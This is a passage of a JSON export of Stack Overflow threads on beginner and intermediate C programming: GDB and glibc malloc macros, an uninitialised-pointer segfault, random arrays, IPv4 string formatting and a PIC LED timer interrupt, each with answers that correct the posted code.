0, "creation_date": 1544688229, "post_id": 53750732, "comment_id": 94366936, "body": "Thank you Basile. Actually, I want to study the internals of malloc(), e.g. how chunks of memories are allocated. Using the debugger to step through the code is a good way to do this."}, {"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1544689758, "post_id": 53750732, "comment_id": 94367594, "body": "That should go into your question: you are not debugging <code>libc</code>  but trying to understand it"}, {"owner": {"reputation": 474, "user_id": 4395727, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-7VriDfWBkOg/AAAAAAAAAAI/AAAAAAAAAEA/I3TnrEA3Ij0/photo.jpg?sz=128", "display_name": "Mohammad Alavi", "link": "https://stackoverflow.com/users/4395727/mohammad-alavi"}, "reply_to_user": {"reputation": 34566, "user_id": 1475978, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdQt.png?s=128&g=1", "display_name": "Nominal Animal", "link": "https://stackoverflow.com/users/1475978/nominal-animal"}, "edited": false, "score": 0, "creation_date": 1567094765, "post_id": 53750732, "comment_id": 101870084, "body": "Thanks for the suggestion @NominalAnimal but there&#39;s one extra parenthesis at the end for <code>__builtin_offsetof</code>. It should be <code>macro define __builtin_offsetof(t, f) ((unsigned long)(&amp;((t *)0)-&gt;f))</code>"}], "tags": [], "owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "is_accepted": true, "score": 3, "last_activity_date": 1544689708, "last_edit_date": 1544689708, "creation_date": 1544645934, "answer_id": 53750732, "question_id": 53750010, "link": "https://stackoverflow.com/questions/53750010/needs-debugging-symbols-for-alignof/53750732#53750732", "title": "Needs debugging symbols for __alignof__", "body": "<p>You won't get any debugging information. Since <code>__alignof__</code> is, like <code>sizeof</code>, <em>only known at compile-time</em>. See <a href=\"https://en.cppreference.com/w/c/types\" rel=\"nofollow noreferrer\">alignof</a> from <code>&lt;stdalign.h&gt;</code></p>\n\n<p>Even by recompiling GCC itself, you won't get it (there is <em>no</em> debugging information available). <code>__alignof__</code> is processed <em>at compile time</em> (so <code>__alignof__ (double)</code> is replaced by 8 during compilation, for x86-64 ABI).</p>\n\n<p>You could guess by yourself the expanded value of <code>MALLOC_ALIGN_MASK</code>.</p>\n\n<p>You could define a <code>const int my_malloc_align_mask = MALLOC_ALIGN_MASK;</code> and use  <code>p my_malloc_align_mask</code> in the debugger.</p>\n\n<blockquote>\n  <p>I'm debugging the glibc library.</p>\n</blockquote>\n\n<p>This is weird. You should <em>trust</em> the <code>glibc</code> library to behave as documented (yes, beware of <em>undefined behavior</em>).</p>\n"}, {"tags": [], "owner": {"reputation": 26934, "user_id": 8316315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/44d833a8a46fea39d7bfca1540ea9c07?s=128&d=identicon&r=PG&f=1", "display_name": "Florian Weimer", "link": "https://stackoverflow.com/users/8316315/florian-weimer"}, "is_accepted": false, "score": 2, "last_activity_date": 1547383077, "creation_date": 1547383077, "answer_id": 54168936, "question_id": 53750010, "link": "https://stackoverflow.com/questions/53750010/needs-debugging-symbols-for-alignof/54168936#54168936", "title": "Needs debugging symbols for __alignof__", "body": "<p>GDB only has a very approximate implementation of C and C++.  It does not use the same C and C++ parser as GCC, so some things are missing, including this GCC extension.  GDB recognizes <code>_Alignof</code>, but it is not exactly the same as <code>__alignof__</code>.  But it will work in this case, so you could change the glibc sources to use it.</p>\n\n<p>LLDB uses the Clang parsers and therefore does not suffer from this particular problem, but will not help you here because apparently, the debugger does not recognize the DWARF data generated by the <code>-g3</code> option, so the macro information is missing from the executable.</p>\n"}], "owner": {"reputation": 139, "user_id": 5719061, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000175604274/picture?type=large", "display_name": "Trung Quan Vo", "link": "https://stackoverflow.com/users/5719061/trung-quan-vo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 159, "favorite_count": 0, "accepted_answer_id": 53750732, "answer_count": 2, "score": 1, "last_activity_date": 1547383077, "creation_date": 1544642656, "last_edit_date": 1544643657, "question_id": 53750010, "link": "https://stackoverflow.com/questions/53750010/needs-debugging-symbols-for-alignof", "title": "Needs debugging symbols for __alignof__", "body": "<p>I'm debugging the glibc library. I've built it with -g3 -O flags. I can print most macros, but not this one. I'm debugging malloc(), and there are a lot of macros that use __alignof__. But I can't find its definition anywhere in glibc source code. Here is an example:</p>\n\n<pre><code>(gdb) p MALLOC_ALIGN_MASK\nNo symbol \"__alignof__\" in current context.\n</code></pre>\n\n<p>And also I got the same problem with __builtin_offsetof. But this one is an built in macro. So the 2 cases are a bit different. Solving this problem will speed up my debugging a bit.</p>\n"}, {"tags": ["c", "struct", "segmentation-fault"], "comments": [{"owner": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "edited": false, "score": 5, "creation_date": 1544641287, "post_id": 53749574, "comment_id": 94352001, "body": "Consider <code>char_number[i]-&#39;0&#39;</code> instead of your <code>switch</code>."}, {"owner": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "edited": false, "score": 2, "creation_date": 1544641400, "post_id": 53749574, "comment_id": 94352055, "body": "The segmentation fault occurs because you declared a pointer <code>number1</code> which is not initialized, it does not point to valid memory but you try to write the input there. change it to <code>char number1[100]</code> (where <code>100</code> should be a meaningful buffer size)."}, {"owner": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "edited": false, "score": 1, "creation_date": 1544641747, "post_id": 53749574, "comment_id": 94352224, "body": "Also note that after inserting you do not know how many digits you wrote in your struct, a possible solution would be to write the least significant digit first and set everything to <code>0</code> after the most significant digit."}], "answers": [{"comments": [{"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 2, "creation_date": 1544641867, "post_id": 53749644, "comment_id": 94352287, "body": "Or even better, declare <code>number1</code> as an automatic array (<code>char number1[32];</code>), and avoid messing with dynamic allocation."}], "tags": [], "owner": {"reputation": 35932, "user_id": 1606345, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/IwiIM.png?s=128&g=1", "display_name": "David Ranieri", "link": "https://stackoverflow.com/users/1606345/david-ranieri"}, "is_accepted": true, "score": 5, "last_activity_date": 1544642044, "last_edit_date": 1544642044, "creation_date": 1544641049, "answer_id": 53749644, "question_id": 53749574, "link": "https://stackoverflow.com/questions/53749574/segmentation-fault-core-dumped-when-using-my-own-struct-with-pointers-to-array/53749644#53749644", "title": "Segmentation fault (core dumped) when using my own struct with pointers to array", "body": "<p>You are using <code>number1</code> uninitialized,</p>\n\n<p>Use</p>\n\n<pre><code>char *number1 = malloc(32);\n</code></pre>\n\n<p>or</p>\n\n<pre><code>char number1[32];\n</code></pre>\n\n<p>before calling <code>scanf</code>, also use a width specifier in order to avoid buffer overflows:</p>\n\n<pre><code>scanf(\"%31s\", number1);\n</code></pre>\n"}], "owner": {"reputation": 31, "user_id": 5674743, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/af0f658a1c65358b98d14a15327676df?s=128&d=identicon&r=PG&f=1", "display_name": "Adrian Zyskowski", "link": "https://stackoverflow.com/users/5674743/adrian-zyskowski"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 75, "favorite_count": 0, "accepted_answer_id": 53749644, "answer_count": 1, "score": 1, "last_activity_date": 1544642404, "creation_date": 1544640784, "last_edit_date": 1544642404, "question_id": 53749574, "link": "https://stackoverflow.com/questions/53749574/segmentation-fault-core-dumped-when-using-my-own-struct-with-pointers-to-array", "title": "Segmentation fault (core dumped) when using my own struct with pointers to array", "body": "<p>Hello can you tell me why is the compiler building sucessfully when there's only one largenumber a, but when I declare another largenumber b and do the exact same things it shows <i> Segmentation fault (core dumped) </i>. I don't understand what's wrong? I can't declare other of type largenumber because it shows segmentation fault</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\n\nstruct largenumber{\n    int numbers[200];\n};\ntypedef struct largenumber largenumber;\n\nvoid insert_number_to_largenumber(int* start, int* end, char *char_number){\n  int* pointer;\n  int i=0;\n  printf(\"array elements\\n\");\n  for(pointer=start; pointer!=end; pointer++){\n\n    switch (char_number[i]) {\n      case 48 :\n        *pointer = 0;\n        break;\n      case 49 :\n        *pointer = 1;\n        break;\n      case 50 :\n        *pointer = 2;\n        break;\n      case 51 :\n        *pointer = 3;\n        break;\n      case 52 :\n        *pointer = 4;\n        break;\n      case 53 :\n        *pointer = 5;\n        break;\n      case 54 :\n        *pointer = 6;\n        break;\n      case 55 :\n        *pointer = 7;\n        break;\n      case 56 :\n        *pointer = 8;\n        break;\n      case 57 :\n        *pointer = 9;\n        break;\n       default:\n       fprintf(stderr, \"array element is not a digit!\\n\");\n       exit(EXIT_FAILURE);\n    }\n\n    printf(\"a.numbers[%d] = %d \\n\", i, *pointer);\n    i++;\n\n\n  }\n}\n\nint main()\n{\n  char* number1;\n  printf(\"input first number\\n\");\n  scanf(\"%s\", number1);\n  largenumber a;\n  insert_number_to_largenumber(a.numbers, a.numbers+strlen(number1), number1);\n\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "random-seed"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 4, "creation_date": 1544640931, "post_id": 53749544, "comment_id": 94351827, "body": "The way to get a random number in the range <code>0</code> to <code>1000</code> is with <code>rand() % 1001</code>. However the code has several issues apart from being an incomplete program, and the compiler should advise you. It is also unclear what you intend."}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 1, "creation_date": 1544641760, "post_id": 53749544, "comment_id": 94352233, "body": "You cannot define <code>myArray</code> two times."}, {"owner": {"reputation": 507, "user_id": 2654727, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c319a24a493153df59e86b43ff78fde0?s=128&d=identicon&r=PG", "display_name": "Tom Drake", "link": "https://stackoverflow.com/users/2654727/tom-drake"}, "edited": false, "score": 1, "creation_date": 1544641783, "post_id": 53749544, "comment_id": 94352247, "body": "You state that you want to randomly generated array of ints, but your code creates an array of a random size, and then does not initialize the contents of this array. In order to initialize the the contents you will need to iterate over the each element in the array and assign the value of myArray[i] to a random number. To print the contents, you will also need to iterate over myArray and print each element separately."}, {"owner": {"reputation": 7, "user_id": 10782475, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-edjbaWFuCbE/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-jMnqbxga-QjEe1B4gPZmzsLkHuiA/mo/photo.jpg?sz=128", "display_name": "Ste", "link": "https://stackoverflow.com/users/10782475/ste"}, "edited": false, "score": 0, "creation_date": 1544642446, "post_id": 53749544, "comment_id": 94352560, "body": "Thanks for the information, will do some more research then have another crack at it."}, {"owner": {"reputation": 1355, "user_id": 2099774, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/0b1616496d50ecbb4ddb4f6a431a2307?s=128&d=identicon&r=PG", "display_name": "BackDoorNoBaby", "link": "https://stackoverflow.com/users/2099774/backdoornobaby"}, "edited": false, "score": 0, "creation_date": 1544642869, "post_id": 53749544, "comment_id": 94352744, "body": "Use a <code>for loop</code> to iterate over your array after its created. You can use the <code>loop variable</code> as the index to your array to assign the random value you generate with each loop"}], "answers": [{"tags": [], "owner": {"reputation": 1118, "user_id": 2191849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fOaLe.jpg?s=128&g=1", "display_name": "static_cast", "link": "https://stackoverflow.com/users/2191849/static-cast"}, "is_accepted": false, "score": 1, "last_activity_date": 1544644360, "last_edit_date": 1544644360, "creation_date": 1544643468, "answer_id": 53750216, "question_id": 53749544, "link": "https://stackoverflow.com/questions/53749544/random-number-array-c/53750216#53750216", "title": "Random Number array. C", "body": "<p>You are correctly generating the random number in your desired range (<em>well close, you say 1000, but your code says 100</em>). </p>\n\n<p>However, you never assign that random value to an index in the array.</p>\n\n<p>So if you want to assign a random number between your range to every index of an array of size 5, <strong><em>Doing something like the following:</em></strong></p>\n\n<pre><code>for (int i = 0; i &lt; 5; i++) //populate each array index of array of size 5\n{\n    myArray[i] = rand() % 1000; //assign random number to index in the array\n    printf(\"Random: %d\\n\", myArray[i]);\n}\n</code></pre>\n\n<p>Currently what your code is doing is saying <code>myArray[&lt;at random index&gt;]</code> do nothing (likely optimized out altogether by the compiler - would also expect the compiler to complain about a redeclaration of a variable with the same name).</p>\n\n<p>Now, if your question is randomly generating array sizes, that's a different answer all together...</p>\n"}], "owner": {"reputation": 7, "user_id": 10782475, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-edjbaWFuCbE/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-jMnqbxga-QjEe1B4gPZmzsLkHuiA/mo/photo.jpg?sz=128", "display_name": "Ste", "link": "https://stackoverflow.com/users/10782475/ste"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 430, "favorite_count": 0, "closed_date": 1544654236, "answer_count": 1, "score": -1, "last_activity_date": 1544644360, "creation_date": 1544640674, "question_id": 53749544, "link": "https://stackoverflow.com/questions/53749544/random-number-array-c", "closed_reason": "Needs more focus", "title": "Random Number array. C", "body": "<p>I'm new to C and I am currently trying to make a randomly generated array of ints. I think I've almost got it but wanting it to have a range of 0 to 1000. Also the output I'm not sure how to format.</p>\n\n<pre><code>            srand ( time(NULL) );\n            int myArray[5] = {};\n            int randomIndex = rand() % 100;\n            int myArray[randomIndex];\n            printf(\"Random: %d\\n\", myArray);\n</code></pre>\n"}, {"tags": ["c", "ip-address"], "comments": [{"owner": {"reputation": 32321, "user_id": 173397, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pqKT8.jpg?s=128&g=1", "display_name": "pm100", "link": "https://stackoverflow.com/users/173397/pm100"}, "edited": false, "score": 0, "creation_date": 1544638951, "post_id": 53749091, "comment_id": 94350804, "body": "how about using inet_ntoa"}, {"owner": {"reputation": 32321, "user_id": 173397, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pqKT8.jpg?s=128&g=1", "display_name": "pm100", "link": "https://stackoverflow.com/users/173397/pm100"}, "edited": false, "score": 0, "creation_date": 1544639059, "post_id": 53749091, "comment_id": 94350865, "body": "why not reserve a fixed size buffer rather than all teh complicated logic. The longest a ipv4 address can be is 16 (999.999.999.999\\0)"}], "answers": [{"comments": [{"owner": {"reputation": 3415, "user_id": 1198474, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/pUCYm.jpg?s=128&g=1", "display_name": "salocinx", "link": "https://stackoverflow.com/users/1198474/salocinx"}, "edited": false, "score": 0, "creation_date": 1544641661, "post_id": 53749148, "comment_id": 94352183, "body": "great, one line :-) thanks!"}], "tags": [], "owner": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "is_accepted": true, "score": 5, "last_activity_date": 1544639978, "last_edit_date": 1544639978, "creation_date": 1544639008, "answer_id": 53749148, "question_id": 53749091, "link": "https://stackoverflow.com/questions/53749091/converting-an-uint8-t-to-an-ip-address-string/53749148#53749148", "title": "Converting an uint8_t[] to an IP address string", "body": "<p>Just <code>snprintf</code> it.</p>\n\n<pre><code>void app_main() {\n    uint8_t ip[] = {192, 168, 0, 99};\n    char buf[3 * 4 + 3 * 1 + 1];\n    snprintf(buf, sizeof(buf), \"%d.%d.%d.%d\", ip[0], ip[1], ip[2], ip[3]);\n    uart_send(buf);\n}\n</code></pre>\n\n<p><code>uint8_t[] ip</code> is not valid C, the <code>[]</code> comes after the variable name.</p>\n\n<ol>\n<li>The <code>sprintf</code> and <code>snprintf</code> will print the formatted string into the memory pointed to by the first arg.</li>\n<li>The <code>snprintf</code> takes additional maximum size argument as the second arg.</li>\n<li>The <code>uint8_t</code> variables are auto-casted to <code>int</code> when passing in variable arguments list - thus you can print them using <code>%d</code> printf modifier.</li>\n<li>Then you have human redable, null terminated string.</li>\n</ol>\n"}, {"comments": [{"owner": {"reputation": 3415, "user_id": 1198474, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/pUCYm.jpg?s=128&g=1", "display_name": "salocinx", "link": "https://stackoverflow.com/users/1198474/salocinx"}, "edited": false, "score": 0, "creation_date": 1544641674, "post_id": 53749487, "comment_id": 94352188, "body": "thanks for your explanation!"}], "tags": [], "owner": {"reputation": 5631, "user_id": 1198321, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f792e733fbf4e4edd6d64842093b7691?s=128&d=identicon&r=PG", "display_name": "lxop", "link": "https://stackoverflow.com/users/1198321/lxop"}, "is_accepted": false, "score": 2, "last_activity_date": 1544640437, "creation_date": 1544640437, "answer_id": 53749487, "question_id": 53749091, "link": "https://stackoverflow.com/questions/53749091/converting-an-uint8-t-to-an-ip-address-string/53749487#53749487", "title": "Converting an uint8_t[] to an IP address string", "body": "<p>The best answer is simply to use <code>snprintf</code> as suggested by Kamil Cuk.</p>\n\n<p>However if you're still wondering why your code didn't work, the answer is on this line:</p>\n\n<pre><code>if(b[j]!='0') {\n</code></pre>\n\n<p>you are only copying characters that aren't zero, which includes null chars. So when a segment of the IP contains less than 3 characters you will be copying a null into the string. The fix is very simple:</p>\n\n<pre><code>if(b[j]!='\\0') {\n</code></pre>\n\n<p>which makes me think it may well have just been a typo!</p>\n"}], "owner": {"reputation": 3415, "user_id": 1198474, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/pUCYm.jpg?s=128&g=1", "display_name": "salocinx", "link": "https://stackoverflow.com/users/1198474/salocinx"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 688, "favorite_count": 0, "closed_date": 1544675441, "accepted_answer_id": 53749148, "answer_count": 2, "score": -1, "last_activity_date": 1544652327, "creation_date": 1544638759, "last_edit_date": 1544652327, "question_id": 53749091, "link": "https://stackoverflow.com/questions/53749091/converting-an-uint8-t-to-an-ip-address-string", "closed_reason": "Duplicate", "title": "Converting an uint8_t[] to an IP address string", "body": "<p>I am currently learning C. My ecosystem consists of an Espressif ESP-32 micro controller and Eclipse CDT IDE. </p>\n\n<p>I am trying to convert an <code>uint8_t[]</code> to a human readable <code>IPv4 address string</code>. I came up with the following code so far:</p>\n\n<pre><code>void app_main() {\n    uint8_t[] ip = {192, 168, 0, 99};\n    dump_ip(ip);\n}\n\nvoid dump_ip(const uint8_t *in) {\n    // ip addresses consist of three dots + terminator '\\0'\n    int size = 4;\n    // count amount of chars needed for specific ip address\n    for(int i=0; i&lt;4; i++) {\n        if(in[i]==0) {\n            size ++;\n        } else {\n            size += ((int)log10(in[i]))+1;\n        }\n    }\n    // allocate memory on heap for an ip address of length 'size'\n    char *ip_str = (char*)malloc(size*sizeof(char));\n    // copy ip address parts to char array\n    int pos = 0;\n    for(int i=0; i&lt;4; i++) {\n        if(in[i]==0) {\n            ip_str[pos] = '0';\n            pos++;\n        } else {\n            char b[4];\n            itoa(in[i], b, 10);\n            for(int j=0; j&lt;3; j++) {\n                if(b[j]!='0') {\n                    ip_str[pos] = b[j];\n                    pos++;\n                }\n            }\n        }\n        // add dot between ip address parts\n        if(i&lt;3) {\n            ip_str[pos] = '.';\n            pos++;\n        }\n    }\n    // add terminator at end of string\n    ip_str[pos] = '\\0';\n    // print to uart interface\n    uart_send(ip_str);\n    // release allocated heap memory\n    free(ip_str);\n}\n</code></pre>\n\n<p>I get the following results when testing with different IP arrays:</p>\n\n<pre><code>uint8_t[] ip = {192, 168, 0, 99};   =&gt;   \"192.168.0.99\"   =&gt; OK\nuint8_t[] ip = {192, 168, 1, 99};   =&gt;   \"192.168.1\"      =&gt; FAILED\nuint8_t[] ip = {192, 168, 10, 99};  =&gt;   \"192.168.1\"      =&gt; FAILED\nuint8_t[] ip = {10, 10, 10, 10};    =&gt;   \"1\"              =&gt; FAILED\n// etc. etc. etc. \n</code></pre>\n\n<p>What am I doing wrong? Is there some more elegant way to accomplish this?</p>\n"}, {"tags": ["c", "binary", "pic", "led"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1544641603, "post_id": 53749031, "comment_id": 94352149, "body": "You don&#39;t show how the interrupt is invoked, but it would be usual to be a timer response with the desired period. If 1Hz is too slow for a timer, use a variable to count in the interrupt and when time is up, reset the count and increment the port value. Although incrementing a port value is not wise in a general sense, since the port may be write-only, or because reading the port may affect its behaviour. It is better (again generally) to use a variable for the LED pattern."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1544641675, "post_id": 53749031, "comment_id": 94352189, "body": "... as for &quot;counting in binary&quot;, incrementing a variable or register does exactly that, although the LEDs might have inverse logic."}, {"owner": {"reputation": 828, "user_id": 10085080, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a79e26083ea7b8473578d079ecc11c2d?s=128&d=identicon&r=PG&f=1", "display_name": "Dan1138", "link": "https://stackoverflow.com/users/10085080/dan1138"}, "edited": false, "score": 0, "creation_date": 1544644153, "post_id": 53749031, "comment_id": 94353416, "body": "@T Sijad, Your question needs to be asked in a better way. See: <a href=\"https://stackoverflow.com/help/mcve\">How to create a Minimal, Complete, and Verifiable example</a>. Questions that involve Microchip controllers also need to specify the FULL part number of the device you seek an answer for and the frequency of the system oscillator. There are over 50 types of controllers that you could be using. The code posted contains some clues, a PIC16F877A is my best guess."}, {"owner": {"reputation": 31, "user_id": 10657216, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7189b211c6ad41e03c66c241a88fcba9?s=128&d=identicon&r=PG&f=1", "display_name": "TS07", "link": "https://stackoverflow.com/users/10657216/ts07"}, "reply_to_user": {"reputation": 828, "user_id": 10085080, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a79e26083ea7b8473578d079ecc11c2d?s=128&d=identicon&r=PG&f=1", "display_name": "Dan1138", "link": "https://stackoverflow.com/users/10085080/dan1138"}, "edited": false, "score": 0, "creation_date": 1544652308, "post_id": 53749031, "comment_id": 94356920, "body": "Thank you both for your answers. Also, @Dan1138, you&#39;re right, I should be more specific in the future but your guess is correct. I am using that exact PIC."}, {"owner": {"reputation": 828, "user_id": 10085080, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a79e26083ea7b8473578d079ecc11c2d?s=128&d=identicon&r=PG&f=1", "display_name": "Dan1138", "link": "https://stackoverflow.com/users/10085080/dan1138"}, "edited": false, "score": 0, "creation_date": 1544664671, "post_id": 53749031, "comment_id": 94360321, "body": "@T Sijad, At this point you should edit your own question to improve the content. At a minimum add comments at the beginning that state the file name, target controller, IDE version, compiler version. A description of the desired behavior is very helpful. The scope of your question is narrow enough that it is possible to post all the code, including how the configuration words are set and how the system clock is initialized (internal oscillator or external crystal, uses PLL or not, etc ...)"}], "answers": [{"tags": [], "owner": {"reputation": 3478, "user_id": 9061264, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TPing.jpg?s=128&g=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/9061264/mike"}, "is_accepted": false, "score": 1, "last_activity_date": 1544683126, "creation_date": 1544683126, "answer_id": 53756266, "question_id": 53749031, "link": "https://stackoverflow.com/questions/53749031/how-to-count-up-in-binary-on-a-board-of-8-leds-pic/53756266#53756266", "title": "How to count up in binary on a board of 8 LEDs - PIC", "body": "<p>If your Timer 0 Interrupt comes e.g every 100ms this example could help:</p>\n\n<pre><code>void interrupt myISR(void) {\n    static uint8_t counter = 0;\n\n    if(TMR0IF) \n    { \n        INTCONbits.TMR0IF = 0;  \n        TMR0 = RELOAD_VALUE_100MS\n        counter++;\n        if (counter &gt;= 10)\n        {\n            counter = 0;\n            PORTD++; \n        }\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 31, "user_id": 10657216, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7189b211c6ad41e03c66c241a88fcba9?s=128&d=identicon&r=PG&f=1", "display_name": "TS07", "link": "https://stackoverflow.com/users/10657216/ts07"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 127, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1544685531, "creation_date": 1544638507, "last_edit_date": 1544685531, "question_id": 53749031, "link": "https://stackoverflow.com/questions/53749031/how-to-count-up-in-binary-on-a-board-of-8-leds-pic", "title": "How to count up in binary on a board of 8 LEDs - PIC", "body": "<p>I have this program and I'm wanting to modify it so the LEDs count up in binary at a rate of 1Hz (1s). </p>\n\n<pre><code>#include &lt;xc.h&gt;           \n\nvoid main(void) { \n    TRISD  = 0x00;          \n    PORTD  = 0x00; \n    INTCON = 0xA0;          \n    OPTION_REGbits.T0CS = 0;     \n    OPTION_REGbits.PSA  = 0;     \n    OPTION_REGbits.PS = 7;          \n    while(1);           \n} \n\nvoid interrupt myISR(void) { \n    if(TMR0IF) { \n        PORTD++; \n        INTCONbits.TMR0IF = 0;  \n    }\n}\n</code></pre>\n\n<p>I understand I will have to modify the <code>myISR</code> function so that <code>PORTD</code> increments after a certain amount of overflows and that a suitable preload value will be needed but in terms of counting in binary, what are the possible ways to go about this? </p>\n"}, {"tags": ["c", "generics", "struct", "linked-list", "adt"], "comments": [{"owner": {"reputation": 4217, "user_id": 9614249, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eJfci.png?s=128&g=1", "display_name": "Increasingly Idiotic", "link": "https://stackoverflow.com/users/9614249/increasingly-idiotic"}, "edited": false, "score": 0, "creation_date": 1544638211, "post_id": 53748943, "comment_id": 94350439, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/982388/how-to-implement-a-linked-list-in-c\">How to implement a linked list in C?</a>"}, {"owner": {"reputation": 4217, "user_id": 9614249, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eJfci.png?s=128&g=1", "display_name": "Increasingly Idiotic", "link": "https://stackoverflow.com/users/9614249/increasingly-idiotic"}, "edited": false, "score": 0, "creation_date": 1544638330, "post_id": 53748943, "comment_id": 94350496, "body": "You might try looking at: <a href=\"https://pseudomuto.com/2013/05/implementing-a-generic-linked-list-in-c/\" rel=\"nofollow noreferrer\">pseudomuto.com/2013/05/implementing-a-generic-linked-list-in&zwnj;&#8203;-c</a>"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 1, "creation_date": 1544639009, "post_id": 53748943, "comment_id": 94350837, "body": "Start by <i>not</i> concealing pointer nature behind your <code>typedef</code>&#39;d type aliases.  In fact, it might be instructional to avoid using <code>typedef</code> at all.  Next, ask yourself how, if your list is generic, it can possibly know how much memory an element requires.  Consider also whether you intend to <i>copy</i> data into your list, or simply store pointers to objects that exist outside it.  There is more, but that should get you aimed in a productive direction."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1544640303, "post_id": 53748943, "comment_id": 94351486, "body": "<code>newLust-&gt;element = malloc(sizeof(Element));</code> is not correct.  Allocation not needed here.  Too many application details ares unclear for recommended alternatives."}, {"owner": {"reputation": 13, "user_id": 10708317, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/69eaf60d1f4adc68a7bb69d99871e14d?s=128&d=identicon&r=PG&f=1", "display_name": 